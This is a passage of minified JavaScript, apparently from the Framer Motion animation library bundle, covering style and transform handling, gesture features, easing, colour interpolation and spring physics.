e=="string"&&e.startsWith(n),ym=mm("--"),ru=mm("var(--"),B0=/var\s*\(\s*--[\w-]+(\s*,\s*(?:(?:[^)(]|\((?:[^)(]+|\([^)(]*\))*\))*)+)?\s*\)/g,N0=(n,e)=>e&&typeof n=="number"?e.transform(n):n,$n=(n,e,r)=>Math.min(Math.max(r,n),e),Tr={test:n=>typeof n=="number",parse:parseFloat,transform:n=>n},hs={...Tr,transform:n=>$n(0,1,n)},$o={...Tr,default:1},ps=n=>Math.round(n*1e5)/1e5,Ca=/(-)?([\d]*\.?[\d])+/g,bm=/(#[0-9a-f]{3,8}|(rgb|hsl)a?\((-?[\d\.]+%?[,\s]+){2}(-?[\d\.]+%?)\s*[\,\/]?\s*[\d\.]*%?\))/gi,L0=/^(#[0-9a-f]{3,8}|(rgb|hsl)a?\((-?[\d\.]+%?[,\s]+){2}(-?[\d\.]+%?)\s*[\,\/]?\s*[\d\.]*%?\))$/i;function Es(n){return typeof n=="string"}const Ps=n=>({test:e=>Es(e)&&e.endsWith(n)&&e.split(" ").length===1,parse:parseFloat,transform:e=>`${e}${n}`}),Fn=Ps("deg"),tn=Ps("%"),ce=Ps("px"),F0=Ps("vh"),U0=Ps("vw"),wf={...tn,parse:n=>tn.parse(n)/100,transform:n=>tn.transform(n*100)},kf={...Tr,transform:Math.round},vm={borderWidth:ce,borderTopWidth:ce,borderRightWidth:ce,borderBottomWidth:ce,borderLeftWidth:ce,borderRadius:ce,radius:ce,borderTopLeftRadius:ce,borderTopRightRadius:ce,borderBottomRightRadius:ce,borderBottomLeftRadius:ce,width:ce,maxWidth:ce,height:ce,maxHeight:ce,size:ce,top:ce,right:ce,bottom:ce,left:ce,padding:ce,paddingTop:ce,paddingRight:ce,paddingBottom:ce,paddingLeft:ce,margin:ce,marginTop:ce,marginRight:ce,marginBottom:ce,marginLeft:ce,rotate:Fn,rotateX:Fn,rotateY:Fn,rotateZ:Fn,scale:$o,scaleX:$o,scaleY:$o,scaleZ:$o,skew:Fn,skewX:Fn,skewY:Fn,distance:ce,translateX:ce,translateY:ce,translateZ:ce,x:ce,y:ce,z:ce,perspective:ce,transformPerspective:ce,opacity:hs,originX:wf,originY:wf,originZ:ce,zIndex:kf,fillOpacity:hs,strokeOpacity:hs,numOctaves:kf};function Uu(n,e,r,s){const{style:a,vars:l,transform:c,transformOrigin:d}=n;let p=!1,f=!1,m=!0;for(const y in e){const v=e[y];if(ym(y)){l[y]=v;continue}const w=vm[y],A=N0(v,w);if(Sr.has(y)){if(p=!0,c[y]=A,!m)continue;v!==(w.default||0)&&(m=!1)}else y.startsWith("origin")?(f=!0,d[y]=A):a[y]=A}if(e.transform||(p||s?a.transform=M0(n.transform,r,m,s):a.transform&&(a.transform="none")),f){const{originX:y="50%",originY:v="50%",originZ:w=0}=d;a.transformOrigin=`${y} ${v} ${w}`}}const zu=()=>({style:{},transform:{},transformOrigin:{},vars:{}});function wm(n,e,r){for(const s in e)!wt(e[s])&&!gm(s,r)&&(n[s]=e[s])}function z0({transformTemplate:n},e,r){return C.useMemo(()=>{const s=zu();return Uu(s,e,{enableHardwareAcceleration:!r},n),Object.assign({},s.vars,s.style)},[e])}function V0(n,e,r){const s=n.style||{},a={};return wm(a,s,n),Object.assign(a,z0(n,e,r)),n.transformValues?n.transformValues(a):a}function W0(n,e,r){const s={},a=V0(n,e,r);return n.drag&&n.dragListener!==!1&&(s.draggable=!1,a.userSelect=a.WebkitUserSelect=a.WebkitTouchCallout="none",a.touchAction=n.drag===!0?"none":`pan-${n.drag==="x"?"y":"x"}`),n.tabIndex===void 0&&(n.onTap||n.onTapStart||n.whileTap)&&(s.tabIndex=0),s.style=a,s}const $0=new Set(["animate","exit","variants","initial","style","values","variants","transition","transformTemplate","transformValues","custom","inherit","onBeforeLayoutMeasure","onAnimationStart","onAnimationComplete","onUpdate","onDragStart","onDrag","onDragEnd","onMeasureDragConstraints","onDirectionLock","onDragTransitionEnd","_dragX","_dragY","onHoverStart","onHoverEnd","onViewportEnter","onViewportLeave","globalTapTarget","ignoreStrict","viewport"]);function aa(n){return n.startsWith("while")||n.startsWith("drag")&&n!=="draggable"||n.startsWith("layout")||n.startsWith("onTap")||n.startsWith("onPan")||n.startsWith("onLayout")||$0.has(n)}let km=n=>!aa(n);function H0(n){n&&(km=e=>e.startsWith("on")?!aa(e):n(e))}try{H0(require("@emotion/is-prop-valid").default)}catch{}function q0(n,e,r){const s={};for(const a in n)a==="values"&&typeof n.values=="object"||(km(a)||r===!0&&aa(a)||!e&&!aa(a)||n.draggable&&a.startsWith("onDrag"))&&(s[a]=n[a]);return s}function xf(n,e,r){return typeof n=="string"?n:ce.transform(e+r*n)}function G0(n,e,r){const s=xf(e,n.x,n.width),a=xf(r,n.y,n.height);return`${s} ${a}`}const K0={offset:"stroke-dashoffset",array:"stroke-dasharray"},J0={offset:"strokeDashoffset",array:"strokeDasharray"};function Q0(n,e,r=1,s=0,a=!0){n.pathLength=1;const l=a?K0:J0;n[l.offset]=ce.transform(-s);const c=ce.transform(e),d=ce.transform(r);n[l.array]=`${c} ${d}`}function Vu(n,{attrX:e,attrY:r,attrScale:s,originX:a,originY:l,pathLength:c,pathSpacing:d=1,pathOffset:p=0,...f},m,y,v){if(Uu(n,f,m,v),y){n.style.viewBox&&(n.attrs.viewBox=n.style.viewBox);return}n.attrs=n.style,n.style={};const{attrs:w,style:A,dimensions:k}=n;w.transform&&(k&&(A.transform=w.transform),delete w.transform),k&&(a!==void 0||l!==void 0||A.transform)&&(A.transformOrigin=G0(k,a!==void 0?a:.5,l!==void 0?l:.5)),e!==void 0&&(w.x=e),r!==void 0&&(w.y=r),s!==void 0&&(w.scale=s),c!==void 0&&Q0(w,c,d,p,!1)}const xm=()=>({...zu(),attrs:{}}),Wu=n=>typeof n=="string"&&n.toLowerCase()==="svg";function Y0(n,e,r,s){const a=C.useMemo(()=>{const l=xm();return Vu(l,e,{enableHardwareAcceleration:!1},Wu(s),n.transformTemplate),{...l.attrs,style:{...l.style}}},[e]);if(n.style){const l={};wm(l,n.style,n),a.style={...l,...a.style}}return a}function X0(n=!1){return(r,s,a,{latestValues:l},c)=>{const p=(Fu(r)?Y0:W0)(s,l,c,r),m={...q0(s,typeof r=="string",n),...p,ref:a},{children:y}=s,v=C.useMemo(()=>wt(y)?y.get():y,[y]);return C.createElement(r,{...m,children:v})}}function Sm(n,{style:e,vars:r},s,a){Object.assign(n.style,e,a&&a.getProjectionStyles(s));for(const l in r)n.style.setProperty(l,r[l])}const Tm=new Set(["baseFrequency","diffuseConstant","kernelMatrix","kernelUnitLength","keySplines","keyTimes","limitingConeAngle","markerHeight","markerWidth","numOctaves","targetX","targetY","surfaceScale","specularConstant","specularExponent","stdDeviation","tableValues","viewBox","gradientTransform","pathLength","startOffset","textLength","lengthAdjust"]);function Am(n,e,r,s){Sm(n,e,void 0,s);for(const a in e.attrs)n.setAttribute(Tm.has(a)?a:Mu(a),e.attrs[a])}function $u(n,e){const{style:r}=n,s={};for(const a in r)(wt(r[a])||e.style&&wt(e.style[a])||gm(a,n))&&(s[a]=r[a]);return s}function Cm(n,e){const r=$u(n,e);for(const s in n)if(wt(n[s])||wt(e[s])){const a=Cs.indexOf(s)!==-1?"attr"+s.charAt(0).toUpperCase()+s.substring(1):s;r[a]=n[s]}return r}function Hu(n,e,r,s={},a={}){return typeof e=="function"&&(e=e(r!==void 0?r:n.custom,s,a)),typeof e=="string"&&(e=n.variants&&n.variants[e]),typeof e=="function"&&(e=e(r!==void 0?r:n.custom,s,a)),e}function Em(n){const e=C.useRef(null);return e.current===null&&(e.current=n()),e.current}const la=n=>Array.isArray(n),Z0=n=>!!(n&&typeof n=="object"&&n.mix&&n.toValue),ek=n=>la(n)?n[n.length-1]||0:n;function ta(n){const e=wt(n)?n.get():n;return Z0(e)?e.toValue():e}function tk({scrapeMotionValuesFromProps:n,createRenderState:e,onMount:r},s,a,l){const c={latestValues:nk(s,a,l,n),renderState:e()};return r&&(c.mount=d=>r(s,d,c)),c}const Pm=n=>(e,r)=>{const s=C.useContext(ka),a=C.useContext(xa),l=()=>tk(n,e,s,a);return r?l():Em(l)};function nk(n,e,r,s){const a={},l=s(n,{});for(const v in l)a[v]=ta(l[v]);let{initial:c,animate:d}=n;const p=Aa(n),f=pm(n);e&&f&&!p&&n.inherit!==!1&&(c===void 0&&(c=e.initial),d===void 0&&(d=e.animate));let m=r?r.initial===!1:!1;m=m||c===!1;const y=m?d:c;return y&&typeof y!="boolean"&&!Ta(y)&&(Array.isArray(y)?y:[y]).forEach(w=>{const A=Hu(n,w);if(!A)return;const{transitionEnd:k,transition:x,...B}=A;for(const _ in B){let P=B[_];if(Array.isArray(P)){const M=m?P.length-1:0;P=P[M]}P!==null&&(a[_]=P)}for(const _ in k)a[_]=k[_]}),a}const Ve=n=>n;class Sf{constructor(){this.order=[],this.scheduled=new Set}add(e){if(!this.scheduled.has(e))return this.scheduled.add(e),this.order.push(e),!0}remove(e){const r=this.order.indexOf(e);r!==-1&&(this.order.splice(r,1),this.scheduled.delete(e))}clear(){this.order.length=0,this.scheduled.clear()}}function rk(n){let e=new Sf,r=new Sf,s=0,a=!1,l=!1;const c=new WeakSet,d={schedule:(p,f=!1,m=!1)=>{const y=m&&a,v=y?e:r;return f&&c.add(p),v.add(p)&&y&&a&&(s=e.order.length),p},cancel:p=>{r.remove(p),c.delete(p)},process:p=>{if(a){l=!0;return}if(a=!0,[e,r]=[r,e],r.clear(),s=e.order.length,s)for(let f=0;f<s;f++){const m=e.order[f];m(p),c.has(m)&&(d.schedule(m),n())}a=!1,l&&(l=!1,d.process(p))}};return d}const Ho=["prepare","read","update","preRender","render","postRender"],ik=40;function sk(n,e){let r=!1,s=!0;const a={delta:0,timestamp:0,isProcessing:!1},l=Ho.reduce((y,v)=>(y[v]=rk(()=>r=!0),y),{}),c=y=>l[y].process(a),d=()=>{const y=performance.now();r=!1,a.delta=s?1e3/60:Math.max(Math.min(y-a.timestamp,ik),1),a.timestamp=y,a.isProcessing=!0,Ho.forEach(c),a.isProcessing=!1,r&&e&&(s=!1,n(d))},p=()=>{r=!0,s=!0,a.isProcessing||n(d)};return{schedule:Ho.reduce((y,v)=>{const w=l[v];return y[v]=(A,k=!1,x=!1)=>(r||p(),w.schedule(A,k,x)),y},{}),cancel:y=>Ho.forEach(v=>l[v].cancel(y)),state:a,steps:l}}const{schedule:Ie,cancel:yn,state:ct,steps:Rc}=sk(typeof requestAnimationFrame<"u"?requestAnimationFrame:Ve,!0),ok={useVisualState:Pm({scrapeMotionValuesFromProps:Cm,createRenderState:xm,onMount:(n,e,{renderState:r,latestValues:s})=>{Ie.read(()=>{try{r.dimensions=typeof e.getBBox=="function"?e.getBBox():e.getBoundingClientRect()}catch{r.dimensions={x:0,y:0,width:0,height:0}}}),Ie.render(()=>{Vu(r,s,{enableHardwareAcceleration:!1},Wu(e.tagName),n.transformTemplate),Am(e,r)})}})},ak={useVisualState:Pm({scrapeMotionValuesFromProps:$u,createRenderState:zu})};function lk(n,{forwardMotionProps:e=!1},r,s){return{...Fu(n)?ok:ak,preloadedFeatures:r,useRender:X0(e),createVisualElement:s,Component:n}}function pn(n,e,r,s={passive:!0}){return n.addEventListener(e,r,s),()=>n.removeEventListener(e,r)}const _m=n=>n.pointerType==="mouse"?typeof n.button!="number"||n.button<=0:n.isPrimary!==!1;function Ea(n,e="page"){return{point:{x:n[e+"X"],y:n[e+"Y"]}}}const ck=n=>e=>_m(e)&&n(e,Ea(e));function gn(n,e,r,s){return pn(n,e,ck(r),s)}const uk=(n,e)=>r=>e(n(r)),Wn=(...n)=>n.reduce(uk);function Im(n){let e=null;return()=>{const r=()=>{e=null};return e===null?(e=n,r):!1}}const Tf=Im("dragHorizontal"),Af=Im("dragVertical");function Rm(n){let e=!1;if(n==="y")e=Af();else if(n==="x")e=Tf();else{const r=Tf(),s=Af();r&&s?e=()=>{r(),s()}:(r&&r(),s&&s())}return e}function Dm(){const n=Rm(!0);return n?(n(),!1):!0}class qn{constructor(e){this.isMounted=!1,this.node=e}update(){}}function Cf(n,e){const r="pointer"+(e?"enter":"leave"),s="onHover"+(e?"Start":"End"),a=(l,c)=>{if(l.pointerType==="touch"||Dm())return;const d=n.getProps();n.animationState&&d.whileHover&&n.animationState.setActive("whileHover",e),d[s]&&Ie.update(()=>d[s](l,c))};return gn(n.current,r,a,{passive:!n.getProps()[s]})}class dk extends qn{mount(){this.unmount=Wn(Cf(this.node,!0),Cf(this.node,!1))}unmount(){}}class hk extends qn{constructor(){super(...arguments),this.isActive=!1}onFocus(){let e=!1;try{e=this.node.current.matches(":focus-visible")}catch{e=!0}!e||!this.node.animationState||(this.node.animationState.setActive("whileFocus",!0),this.isActive=!0)}onBlur(){!this.isActive||!this.node.animationState||(this.node.animationState.setActive("whileFocus",!1),this.isActive=!1)}mount(){this.unmount=Wn(pn(this.node.current,"focus",()=>this.onFocus()),pn(this.node.current,"blur",()=>this.onBlur()))}unmount(){}}const Om=(n,e)=>e?n===e?!0:Om(n,e.parentElement):!1;function Dc(n,e){if(!e)return;const r=new PointerEvent("pointer"+n);e(r,Ea(r))}class pk extends qn{constructor(){super(...arguments),this.removeStartListeners=Ve,this.removeEndListeners=Ve,this.removeAccessibleListeners=Ve,this.startPointerPress=(e,r)=>{if(this.isPressing)return;this.removeEndListeners();const s=this.node.getProps(),l=gn(window,"pointerup",(d,p)=>{if(!this.checkPressEnd())return;const{onTap:f,onTapCancel:m,globalTapTarget:y}=this.node.getProps();Ie.update(()=>{!y&&!Om(this.node.current,d.target)?m&&m(d,p):f&&f(d,p)})},{passive:!(s.onTap||s.onPointerUp)}),c=gn(window,"pointercancel",(d,p)=>this.cancelPress(d,p),{passive:!(s.onTapCancel||s.onPointerCancel)});this.removeEndListeners=Wn(l,c),this.startPress(e,r)},this.startAccessiblePress=()=>{const e=l=>{if(l.key!=="Enter"||this.isPressing)return;const c=d=>{d.key!=="Enter"||!this.checkPressEnd()||Dc("up",(p,f)=>{const{onTap:m}=this.node.getProps();m&&Ie.update(()=>m(p,f))})};this.removeEndListeners(),this.removeEndListeners=pn(this.node.current,"keyup",c),Dc("down",(d,p)=>{this.startPress(d,p)})},r=pn(this.node.current,"keydown",e),s=()=>{this.isPressing&&Dc("cancel",(l,c)=>this.cancelPress(l,c))},a=pn(this.node.current,"blur",s);this.removeAccessibleListeners=Wn(r,a)}}startPress(e,r){this.isPressing=!0;const{onTapStart:s,whileTap:a}=this.node.getProps();a&&this.node.animationState&&this.node.animationState.setActive("whileTap",!0),s&&Ie.update(()=>s(e,r))}checkPressEnd(){return this.removeEndListeners(),this.isPressing=!1,this.node.getProps().whileTap&&this.node.animationState&&this.node.animationState.setActive("whileTap",!1),!Dm()}cancelPress(e,r){if(!this.checkPressEnd())return;const{onTapCancel:s}=this.node.getProps();s&&Ie.update(()=>s(e,r))}mount(){const e=this.node.getProps(),r=gn(e.globalTapTarget?window:this.node.current,"pointerdown",this.startPointerPress,{passive:!(e.onTapStart||e.onPointerStart)}),s=pn(this.node.current,"focus",this.startAccessiblePress);this.removeStartListeners=Wn(r,s)}unmount(){this.removeStartListeners(),this.removeEndListeners(),this.removeAccessibleListeners()}}const iu=new WeakMap,Oc=new WeakMap,fk=n=>{const e=iu.get(n.target);e&&e(n)},gk=n=>{n.forEach(fk)};function mk({root:n,...e}){const r=n||document;Oc.has(r)||Oc.set(r,{});const s=Oc.get(r),a=JSON.stringify(e);return s[a]||(s[a]=new IntersectionObserver(gk,{root:n,...e})),s[a]}function yk(n,e,r){const s=mk(e);return iu.set(n,r),s.observe(n),()=>{iu.delete(n),s.unobserve(n)}}const bk={some:0,all:1};class vk extends qn{constructor(){super(...arguments),this.hasEnteredView=!1,this.isInView=!1}startObserver(){this.unmount();const{viewport:e={}}=this.node.getProps(),{root:r,margin:s,amount:a="some",once:l}=e,c={root:r?r.current:void 0,rootMargin:s,threshold:typeof a=="number"?a:bk[a]},d=p=>{const{isIntersecting:f}=p;if(this.isInView===f||(this.isInView=f,l&&!f&&this.hasEnteredView))return;f&&(this.hasEnteredView=!0),this.node.animationState&&this.node.animationState.setActive("whileInView",f);const{onViewportEnter:m,onViewportLeave:y}=this.node.getProps(),v=f?m:y;v&&v(p)};return yk(this.node.current,c,d)}mount(){this.startObserver()}update(){if(typeof IntersectionObserver>"u")return;const{props:e,prevProps:r}=this.node;["amount","margin","root"].some(wk(e,r))&&this.startObserver()}unmount(){}}function wk({viewport:n={}},{viewport:e={}}={}){return r=>n[r]!==e[r]}const kk={inView:{Feature:vk},tap:{Feature:pk},focus:{Feature:hk},hover:{Feature:dk}};function jm(n,e){if(!Array.isArray(e))return!1;const r=e.length;if(r!==n.length)return!1;for(let s=0;s<r;s++)if(e[s]!==n[s])return!1;return!0}function xk(n){const e={};return n.values.forEach((r,s)=>e[s]=r.get()),e}function Sk(n){const e={};return n.values.forEach((r,s)=>e[s]=r.getVelocity()),e}function Pa(n,e,r){const s=n.getProps();return Hu(s,e,r!==void 0?r:s.custom,xk(n),Sk(n))}let qu=Ve;const wr=n=>n*1e3,mn=n=>n/1e3,Tk={current:!1},Mm=n=>Array.isArray(n)&&typeof n[0]=="number";function Bm(n){return!!(!n||typeof n=="string"&&Nm[n]||Mm(n)||Array.isArray(n)&&n.every(Bm))}const us=([n,e,r,s])=>`cubic-bezier(${n}, ${e}, ${r}, ${s})`,Nm={linear:"linear",ease:"ease",easeIn:"ease-in",easeOut:"ease-out",easeInOut:"ease-in-out",circIn:us([0,.65,.55,1]),circOut:us([.55,0,1,.45]),backIn:us([.31,.01,.66,-.59]),backOut:us([.33,1.53,.69,.99])};function Lm(n){if(n)return Mm(n)?us(n):Array.isArray(n)?n.map(Lm):Nm[n]}function Ak(n,e,r,{delay:s=0,duration:a,repeat:l=0,repeatType:c="loop",ease:d,times:p}={}){const f={[e]:r};p&&(f.offset=p);const m=Lm(d);return Array.isArray(m)&&(f.easing=m),n.animate(f,{delay:s,duration:a,easing:Array.isArray(m)?"linear":m,fill:"both",iterations:l+1,direction:c==="reverse"?"alternate":"normal"})}function Ck(n,{repeat:e,repeatType:r="loop"}){const s=e&&r!=="loop"&&e%2===1?0:n.length-1;return n[s]}const Fm=(n,e,r)=>(((1-3*r+3*e)*n+(3*r-6*e))*n+3*e)*n,Ek=1e-7,Pk=12;function _k(n,e,r,s,a){let l,c,d=0;do c=e+(r-e)/2,l=Fm(c,s,a)-n,l>0?r=c:e=c;while(Math.abs(l)>Ek&&++d<Pk);return c}function _s(n,e,r,s){if(n===e&&r===s)return Ve;const a=l=>_k(l,0,1,n,r);return l=>l===0||l===1?l:Fm(a(l),e,s)}const Ik=_s(.42,0,1,1),Rk=_s(0,0,.58,1),Um=_s(.42,0,.58,1),Dk=n=>Array.isArray(n)&&typeof n[0]!="number",zm=n=>e=>e<=.5?n(2*e)/2:(2-n(2*(1-e)))/2,Vm=n=>e=>1-n(1-e),Gu=n=>1-Math.sin(Math.acos(n)),Wm=Vm(Gu),Ok=zm(Gu),$m=_s(.33,1.53,.69,.99),Ku=Vm($m),jk=zm(Ku),Mk=n=>(n*=2)<1?.5*Ku(n):.5*(2-Math.pow(2,-10*(n-1))),Bk={linear:Ve,easeIn:Ik,easeInOut:Um,easeOut:Rk,circIn:Gu,circInOut:Ok,circOut:Wm,backIn:Ku,backInOut:jk,backOut:$m,anticipate:Mk},Ef=n=>{if(Array.isArray(n)){qu(n.length===4);const[e,r,s,a]=n;return _s(e,r,s,a)}else if(typeof n=="string")return Bk[n];return n},Ju=(n,e)=>r=>!!(Es(r)&&L0.test(r)&&r.startsWith(n)||e&&Object.prototype.hasOwnProperty.call(r,e)),Hm=(n,e,r)=>s=>{if(!Es(s))return s;const[a,l,c,d]=s.match(Ca);return{[n]:parseFloat(a),[e]:parseFloat(l),[r]:parseFloat(c),alpha:d!==void 0?parseFloat(d):1}},Nk=n=>$n(0,255,n),jc={...Tr,transform:n=>Math.round(Nk(n))},yr={test:Ju("rgb","red"),parse:Hm("red","green","blue"),transform:({red:n,green:e,blue:r,alpha:s=1})=>"rgba("+jc.transform(n)+", "+jc.transform(e)+", "+jc.transform(r)+", "+ps(hs.transform(s))+")"};function Lk(n){let e="",r="",s="",a="";return n.length>5?(e=n.substring(1,3),r=n.substring(3,5),s=n.substring(5,7),a=n.substring(7,9)):(e=n.substring(1,2),r=n.substring(2,3),s=n.substring(3,4),a=n.substring(4,5),e+=e,r+=r,s+=s,a+=a),{red:parseInt(e,16),green:parseInt(r,16),blue:parseInt(s,16),alpha:a?parseInt(a,16)/255:1}}const su={test:Ju("#"),parse:Lk,transform:yr.transform},hi={test:Ju("hsl","hue"),parse:Hm("hue","saturation","lightness"),transform:({hue:n,saturation:e,lightness:r,alpha:s=1})=>"hsla("+Math.round(n)+", "+tn.transform(ps(e))+", "+tn.transform(ps(r))+", "+ps(hs.transform(s))+")"},ht={test:n=>yr.test(n)||su.test(n)||hi.test(n),parse:n=>yr.test(n)?yr.parse(n):hi.test(n)?hi.parse(n):su.parse(n),transform:n=>Es(n)?n:n.hasOwnProperty("red")?yr.transform(n):hi.transform(n)},Ne=(n,e,r)=>-r*n+r*e+n;function Mc(n,e,r){return r<0&&(r+=1),r>1&&(r-=1),r<1/6?n+(e-n)*6*r:r<1/2?e:r<2/3?n+(e-n)*(2/3-r)*6:n}function Fk({hue:n,saturation:e,lightness:r,alpha:s}){n/=360,e/=100,r/=100;let a=0,l=0,c=0;if(!e)a=l=c=r;else{const d=r<.5?r*(1+e):r+e-r*e,p=2*r-d;a=Mc(p,d,n+1/3),l=Mc(p,d,n),c=Mc(p,d,n-1/3)}return{red:Math.round(a*255),green:Math.round(l*255),blue:Math.round(c*255),alpha:s}}const Bc=(n,e,r)=>{const s=n*n;return Math.sqrt(Math.max(0,r*(e*e-s)+s))},Uk=[su,yr,hi],zk=n=>Uk.find(e=>e.test(n));function Pf(n){const e=zk(n);let r=e.parse(n);return e===hi&&(r=Fk(r)),r}const qm=(n,e)=>{const r=Pf(n),s=Pf(e),a={...r};return l=>(a.red=Bc(r.red,s.red,l),a.green=Bc(r.green,s.green,l),a.blue=Bc(r.blue,s.blue,l),a.alpha=Ne(r.alpha,s.alpha,l),yr.transform(a))};function Vk(n){var e,r;return isNaN(n)&&Es(n)&&(((e=n.match(Ca))===null||e===void 0?void 0:e.length)||0)+(((r=n.match(bm))===null||r===void 0?void 0:r.length)||0)>0}const Gm={regex:B0,countKey:"Vars",token:"${v}",parse:Ve},Km={regex:bm,countKey:"Colors",token:"${c}",parse:ht.parse},Jm={regex:Ca,countKey:"Numbers",token:"${n}",parse:Tr.parse};function Nc(n,{regex:e,countKey:r,token:s,parse:a}){const l=n.tokenised.match(e);l&&(n["num"+r]=l.length,n.tokenised=n.tokenised.replace(e,s),n.values.push(...l.map(a)))}function ca(n){const e=n.toString(),r={value:e,tokenised:e,values:[],numVars:0,numColors:0,numNumbers:0};return r.value.includes("var(--")&&Nc(r,Gm),Nc(r,Km),Nc(r,Jm),r}function Qm(n){return ca(n).values}function Ym(n){const{values:e,numColors:r,numVars:s,tokenised:a}=ca(n),l=e.length;return c=>{let d=a;for(let p=0;p<l;p++)p<s?d=d.replace(Gm.token,c[p]):p<s+r?d=d.replace(Km.token,ht.transform(c[p])):d=d.replace(Jm.token,ps(c[p]));return d}}const Wk=n=>typeof n=="number"?0:n;function $k(n){const e=Qm(n);return Ym(n)(e.map(Wk))}const Hn={test:Vk,parse:Qm,createTransformer:Ym,getAnimatableNone:$k},Xm=(n,e)=>r=>`${r>0?e:n}`;function Zm(n,e){return typeof n=="number"?r=>Ne(n,e,r):ht.test(n)?qm(n,e):n.startsWith("var(")?Xm(n,e):ty(n,e)}const ey=(n,e)=>{const r=[...n],s=r.length,a=n.map((l,c)=>Zm(l,e[c]));return l=>{for(let c=0;c<s;c++)r[c]=a[c](l);return r}},Hk=(n,e)=>{const r={...n,...e},s={};for(const a in r)n[a]!==void 0&&e[a]!==void 0&&(s[a]=Zm(n[a],e[a]));return a=>{for(const l in s)r[l]=s[l](a);return r}},ty=(n,e)=>{const r=Hn.createTransformer(e),s=ca(n),a=ca(e);return s.numVars===a.numVars&&s.numColors===a.numColors&&s.numNumbers>=a.numNumbers?Wn(ey(s.values,a.values),r):Xm(n,e)},xs=(n,e,r)=>{const s=e-n;return s===0?1:(r-n)/s},_f=(n,e)=>r=>Ne(n,e,r);function qk(n){return typeof n=="number"?_f:typeof n=="string"?ht.test(n)?qm:ty:Array.isArray(n)?ey:typeof n=="object"?Hk:_f}function Gk(n,e,r){const s=[],a=r||qk(n[0]),l=n.length-1;for(let c=0;c<l;c++){let d=a(n[c],n[c+1]);if(e){const p=Array.isArray(e)?e[c]||Ve:e;d=Wn(p,d)}s.push(d)}return s}function ny(n,e,{clamp:r=!0,ease:s,mixer:a}={}){const l=n.length;if(qu(l===e.length),l===1)return()=>e[0];n[0]>n[l-1]&&(n=[...n].reverse(),e=[...e].reverse());const c=Gk(e,s,a),d=c.length,p=f=>{let m=0;if(d>1)for(;m<n.length-2&&!(f<n[m+1]);m++);const y=xs(n[m],n[m+1],f);return c[m](y)};return r?f=>p($n(n[0],n[l-1],f)):p}function Kk(n,e){const r=n[n.length-1];for(let s=1;s<=e;s++){const a=xs(0,e,s);n.push(Ne(r,1,a))}}function Jk(n){const e=[0];return Kk(e,n.length-1),e}function Qk(n,e){return n.map(r=>r*e)}function Yk(n,e){return n.map(()=>e||Um).splice(0,n.length-1)}function ua({duration:n=300,keyframes:e,times:r,ease:s="easeInOut"}){const a=Dk(s)?s.map(Ef):Ef(s),l={done:!1,value:e[0]},c=Qk(r&&r.length===e.length?r:Jk(e),n),d=ny(c,e,{ease:Array.isArray(a)?a:Yk(e,a)});return{calculatedDuration:n,next:p=>(l.value=d(p),l.done=p>=n,l)}}function ry(n,e){return e?n*(1e3/e):0}const Xk=5;function iy(n,e,r){const s=Math.max(e-Xk,0);return ry(r-n(s),e-s)}const Lc=.001,Zk=.01,ex=10,tx=.05,nx=1;function rx({duration:n=800,bounce:e=.25,velocity:r=0,mass:s=1}){let a,l,c=1-e;c=$n(tx,nx,c),n=$n(Zk,ex,mn(n)),c<1?(a=f=>{const m=f*c,y=m*n,v=m-r,w=ou(f,c),A=Math.exp(-y);return Lc-v/w*A},l=f=>{const y=f*c*n,v=y*r+r,w=Math.pow(c,2)*Math.pow(f,2)*n,A=Math.exp(-y),k=ou(Math.pow(f,2),c);return(-a(f)+Lc>0?-1:1)*((v-w)*A)/k}):(a=f=>{const m=Math.exp(-f*n),y=(f-r)*n+1;return-Lc+m*y},l=f=>{const m=Math.exp(-f*n),y=(r-f)*(n*n);return m*y});const d=5/n,p=sx(a,l,d);if(n=wr(n),isNaN(p))return{stiffness:100,damping:10,duration:n};{const f=Math.pow(p,2)*s;return{stiffness:f,damping:c*2*Math.sqrt(s*f),duration:n}}}const ix=12;function sx(n,e,r){let s=r;for(let a=1;a<ix;a++)s=s-n(s)/e(s);return s}function ou(n,e){return n*Math.sqrt(1-e*e)}const ox=["duration","bounce"],ax=["stiffness","damping","mass"];function If(n,e){return e.some(r=>n[r]!==void 0)}function lx(n){let e={velocity:0,stiffness:100,damping:10,mass:1,isResolvedFromDuration:!1,...n};if(!If(n,ax)&&If(n,ox)){const r=rx(n);e={...e,...r,mass:1},e.isResolvedFromDuration=!0}return e}function sy({keyframes:n,restDelta:e,restSpeed:r,...s}){const a=n[0],l=n[n.length-1],c={done:!1,value:a},{stiffness:d,damping:p,mass:f,duration:m,velocity:y,isResolvedFromDuration:v}=lx({...s,velocity:-mn(s.velocity||0)}),w=y||0,A=p/(2*Math.sqrt(d*f)),k=l-a,x=mn(Math.sqrt(d/f)),B=Math.abs(k)<5;r||(r=B?.01:2),e||(e=B?.005:.5);let _;if(A<1){const P=ou(x,A);_=M=>{const V=Math.exp(-A*x*M);return l-V*((w+A*x*k)/P*Math.sin(P*M)+k*Math.cos(P*M))}}else if(A===1)_=P=>l-Math.exp(-x*P)*(k+(w+x*k)*P);else{const P=x*Math.sqrt(A*A-1);_=M=>{const V=Math.exp(-A*x*M),U=Math.min(P*M,300);return l-V*((w+A*x*k)*Math.sinh(U)+P*k*Math.cosh(U))/P}}return{calculatedDuration:v&&m||null,next:P=>{const M=_(P);if(v)c.done=P>=m;else{let V=w;P!==0&&(A<1?V=iy(_,P,M):V=0);const U=Math.abs(V)<=r,W=Math.abs(l-M)<=e;c.done=U&&W}return c.value=c.done?l:M,c}}}function Rf({keyframes:n,velocity:e=0,power:r=.8,timeConstant:s=325,bounceDamping:a=10,bounceStiffness:l=500,modifyTarget:c,min:d,max:p,restDelta:f=.5,restSpeed:m}){const y=n[0],v={done:!1,value:y},w=G=>d!==void 0&&G<d||p!==void 0&&G>p,A=G=>d===void 0?p:p===void 0||Math.abs(d-G)<Math.abs(p-G)?d:p;let k=r*e;const x=y+k,B=c===void 0?x:c(x);B!==x&&(k=B-y);const _=G=>-k*Math.exp(-G/s),P=G=>B+_(G),M=G=>{const ee=_(G),ye=P(G);v.done=Math.abs(ee)<=f,v.value=v.done?B:ye};let V,U;const W=G=>{w(v.value)&&(V=G,U=sy({keyframes:[v.value,A(v.value)],velocity:iy(P,G,v.value),damping:a,stiffness:l,restDelta:f,restSpeed:m}))};return W(0),{calculatedDuration:null,next:G=>{let ee=!1;return!U&&V===void 0&&(ee=!0,M(G),W(G)),V!==void 0&&G>V?U.next(G-V):(!ee&&M(G),v)}}}const cx=n=>{const e=({timestamp:r})=>n(r);return{start:()=>Ie.update(e,!0),stop:()=>yn(e),now:()=>ct.isProcessing?ct.timestamp:performance.now()}},Df=2e4;function Of(n){let e=0;const r=50;let 